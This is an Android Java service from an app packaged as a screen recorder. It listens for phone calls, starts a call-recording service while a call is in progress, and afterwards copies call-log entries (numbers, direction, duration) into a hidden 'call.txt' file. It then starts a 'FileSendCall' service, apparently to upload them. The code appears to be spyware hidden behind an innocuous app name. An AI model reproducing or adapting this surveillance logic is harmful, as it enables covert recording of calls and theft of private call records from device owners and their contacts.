package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.R;
import com.recorder.screen.screen_recorder.helper.Values;

import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.Date;
import java.util.List;

public class disconnectcall extends Service 
{
	private final String myprefscall = "mySharedPreferencescall";
	private final String myprefscallrecording = "mySharedPreferencescallrecording";
	public static boolean disconnect = false;
	private boolean callrecording_allowed = true;
	long time = 0;
	public static int calls = 0;
	private TelephonyManager tm = null;

	public IBinder onBind(Intent intent) 
	{
		return null;
	}

	public void onCreate() {

		super.onCreate();
		try
		{
			//Log.d("Debug", "disconnectcall oncreate");
			String builder = android.os.Build.MANUFACTURER;
			//Log.d(getClass().getSimpleName(), "device value" + builder);
			// if (android.os.Build.MANUFACTURER.contains("HTC"))
			callrecording_allowed = true;
			disconnect = true;
			try {
				FileOutputStream fOut = openFileOutput("call.txt", MODE_APPEND);
				fOut.close();
			} catch (Exception e) {
				Log.d(getClass().getSimpleName(), "EXception in disconnectcall " + e);
			}
			if (isInstalled(getApplicationContext(), "ibom.com.htc.desire")) {
				try {
					Thread.sleep(2000);

				} 
				catch (InterruptedException e) 
				{
					Log.e(getClass().getSimpleName(), "Exception in sleep :" + e);
				}
			}
			tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
			tm.listen(mPhoneListener, PhoneStateListener.LISTEN_CALL_STATE);
		}
		catch(Exception e)
		{
			//Log.d(getClass().getSimpleName(), "Exception:"+e);
		}

	}

	public void onDestroy() {

		disconnect = false;
		if (tm != null)
			tm.listen(mPhoneListener, PhoneStateListener.LISTEN_NONE);

		super.onDestroy();

	}

	private PhoneStateListener mPhoneListener = new PhoneStateListener() {

		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				if (Values.getSharedPrefrence("iconstatus", getApplicationContext()).equalsIgnoreCase("1")) {
					switch (state) {
						case TelephonyManager.CALL_STATE_RINGING:
							Log.d("startvoice", "CALL_STATE_RINGING");
							calls++;
							getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
							//getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
							getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
							getApplicationContext().stopService(new Intent(getApplicationContext(), StatusCheck.class));
				/*	getApplicationContext().stopService(
							new Intent(getApplicationContext(), mainservice.class));*/
							getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
							getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
							getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
							getApplicationContext().startService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
							break;

						case TelephonyManager.CALL_STATE_OFFHOOK: // call in progress

							Log.d("startvoice", "CALL_STATE_OFFHOOK");
							if (!callrecording_allowed)
								break;
							getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
							//getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
							getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
							//	getApplicationContext().stopService(new Intent(getApplicationContext(), mainservice.class));
						/*SharedPreferences mysharedpreferences5 = getSharedPreferences(
								myprefscallrecording, MODE_PRIVATE);
						String callrecording = mysharedpreferences5.getString(
								getString(R.string.CALLRECORDING), "");
						if (callrecording.equalsIgnoreCase("A"))*/
							getApplicationContext().startService(new Intent(getApplicationContext(), startcallrecording.class));
							break;
						case TelephonyManager.CALL_STATE_IDLE:
							Log.d("startvoice", "CALL_STATE_IDLE");
							getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
							getApplicationContext().startService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
							if (calls == 0) {
								//Log.d(getClass().getSimpleName(), "in idle state calls was 0 breaking");
								break;
							}
							try {
								Log.d(getClass().getSimpleName(), "thread is going to sleep");
								Thread.sleep(2500);
								Log.d(getClass().getSimpleName(), "thread awaken");
							} catch (Exception e) {
								Log.d(getClass().getSimpleName(), "thread interrupted " + e);
							}

							int mode = Context.MODE_PRIVATE;
							SharedPreferences mySharedPreferences = getSharedPreferences(myprefscall, mode);
							String call = mySharedPreferences.getString(getString(R.string.CALL), "");

							if (call.equalsIgnoreCase("A")) {
								try {
									ContentResolver resolver = getApplicationContext()
											.getContentResolver();
									Cursor cur = resolver.query(CallLog.Calls.CONTENT_URI,
											null, null, null,
											CallLog.Calls.DEFAULT_SORT_ORDER);

									if (!cur.moveToFirst()) {
										//Log.d(getClass().getSimpleName(),"in idle state cursor was empty breaking");
										cur.close();
										break;
									}
									int i = 0;
									FileOutputStream fOut = openFileOutput("call.txt", MODE_APPEND);
									OutputStreamWriter osw = new OutputStreamWriter(fOut);

									do {

										int numberColumn = cur.getColumnIndex(CallLog.Calls.NUMBER);
										int typeColumn = cur.getColumnIndex(CallLog.Calls.TYPE);
										int durationcolumn = cur.getColumnIndex(CallLog.Calls.DURATION);
										Date dt = new Date();
										String t = dt.toLocaleString().toString();
										String number = cur.getString(numberColumn);
										String type = cur.getString(typeColumn);
										String Duration = cur.getString(durationcolumn);
										Log.d(getClass().getSimpleName(), "Number " + number);
										Log.d(getClass().getSimpleName(), "type " + type);
										Log.d(getClass().getSimpleName(), "duration " + Duration);
										String dir = "";

										try {
											int dircode = Integer.parseInt(type);
											switch (dircode) {
												case CallLog.Calls.OUTGOING_TYPE:
													dir = "OUTGOING";
													break;

												case CallLog.Calls.INCOMING_TYPE:
													dir = "INCOMING";
													break;

												case CallLog.Calls.MISSED_TYPE:
													dir = "MISSED";
													break;
											}
										} catch (NumberFormatException ex) {
											Log.d(getClass().getSimpleName(), "exception in format" + ex);
										}
										if (dir == null || dir.length() == 0)
											dir = "NA";
										if (!mainservice.write_lock) {
											osw.append("<CLCall>");
											osw.append("<CLNumber>");
											osw.append(number);

											osw.append(" ");
											osw.append("</CLNumber>");
											osw.append("<CLDirection>");
											osw.append(dir);
											osw.append(" ");
											osw.append("</CLDirection>");
											osw.append("<CLDateStart>");
											osw.append(t + " duration " + Duration
													+ " seconds");
											osw.append("</CLDateStart>");
											osw.append("</CLCall>");
										}
										i++;

									} while (cur.moveToNext() && i < calls);

									osw.flush();
									osw.close();
									fOut.close();
									cur.close();
								} catch (Exception e) {
									Log.d(getClass().getSimpleName(), "exception thrown in cursor outgoing call " + e);
								}
							}
							calls = 0;
							getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
							getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
							getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
							if (!StatusCheck.StatusCheck_start)
								getApplicationContext().stopService(new Intent(getApplicationContext(), StatusCheck.class));
							getApplicationContext().startService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
							//Log.d("Debug", "disconnectcall Idle state");
							break;

						default:
							// Log.d(getClass().getSimpleName(), "ADVANCEDSNF Unknown phone state=" + state);
					}
				}
			} catch (Exception e) {
				Log.d(getClass().getSimpleName(), "Exception:" + e);
			}
			//TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
			int phoneType = tm.getPhoneType();

			/*switch (phoneType) {
				case TelephonyManager.PHONE_TYPE_SIP:
					System.out.println("PHONE_TYPE_SIP ==");
					break;

				case TelephonyManager.PHONE_TYPE_GSM:
					System.out.println("PHONE_TYPE_GSM ==");
					break;

				case TelephonyManager.PHONE_TYPE_CDMA:
					System.out.println("PHONE_TYPE_CDMA ==");
					break;

				default:
					System.out.println("PHONE_TYPE_Unknown==");
					break;
			}*/

		}


	};

	public static Boolean isInstalled(Context context, String packageName) 
	{
		try
		{
			final PackageManager pm = context.getPackageManager();
			// get a list of installed apps.
			List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

			for (ApplicationInfo packageInfo : packages) {
				if (packageInfo.packageName.equals(packageName)) {
					return true;
				}
			}
			return false;
		}
		catch(Exception e)
		{
			return false;
		}
	}
}


